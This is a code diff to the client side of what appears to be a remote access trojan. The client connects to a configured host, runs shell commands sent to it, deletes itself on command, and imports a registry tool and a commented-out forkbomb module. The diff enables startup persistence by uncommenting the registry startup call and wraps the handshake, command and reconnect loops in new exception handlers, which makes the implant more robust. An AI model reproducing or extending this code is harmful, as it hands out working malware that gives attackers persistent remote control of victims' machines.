@@ -7,6 +7,7 @@ import queue
 import tools.regedit as regedit
 # import tools.forkbomb as forkbomb
 from tools.packet_manager import p_manager
+from tools.exception_handler import exception_handler
 from tools.dictionary import *
 from tools.utils import packet_send, packet_recv, file_recv
 import os
@@ -31,7 +32,7 @@ class client:
         self.list = mem_random(1000,5000)
         print("Done")
 
-        # regedit.placeStartup()
+        regedit.placeStartup()
         self.sock = None
         self.HOST = HOST
         self.PORT = PORT
@@ -66,6 +67,9 @@ class client:
             except socket.timeout:
                 print("Socket timed out on handshake..")
                 leftovers = b''
+            except Exception as e:
+                exception_handler(e)
+                continue
         print("Handshake complete...")
 
     def exe_tool(self, message):
@@ -122,7 +126,8 @@ class client:
                         data = self.execute_commands(message[PK_PAYLOAD_FLAG])
                         return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                         return_message[PK_PAYLOAD_FLAG] = data
-                    except:
+                    except Exception as e:
+                        exception_handler(e)
                         return_message[PK_COMMAND_FLAG] = COMMAND_ERROR
                         return_message[PK_PAYLOAD_FLAG] = "Error in inputting the command."
 
@@ -161,6 +166,7 @@ class client:
                         regedit.removeStartup()
                         os.remove(sys.argv[0])
                     except Exception as e:
+                        exception_handler(e)
                         return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                         return_message[PK_PAYLOAD_FLAG] = "Delete process Failed: {}".format(e)
                         self.send_list.put(return_message)
@@ -169,6 +175,7 @@ class client:
                     return_message[PK_PAYLOAD_FLAG] = "Unknown command. Type HLP to get Help"
                     self.send_list.put(return_message)
             except Exception as e:
+                exception_handler(e)
                 self.stop = True
                 return
         return
@@ -200,6 +207,7 @@ class client:
                 leftovers = b''
                 continue
             except Exception as e:
+                exception_handler(e)
                 self.stop = True
                 return False
 
@@ -216,6 +224,7 @@ class client:
                                 conn=self.sock,
                                 encrypt=True)
             except Exception as e:
+                exception_handler(e)
                 print("ERROR IN SEND_LIST FUNCTION.")
                 self.stop = True
                 return
@@ -248,6 +257,7 @@ class client:
                 self.stop = False
                 time.sleep(1)
             except Exception as e:
+                exception_handler(e)
                 print("Connection Failed.")
                 continue
             finally:
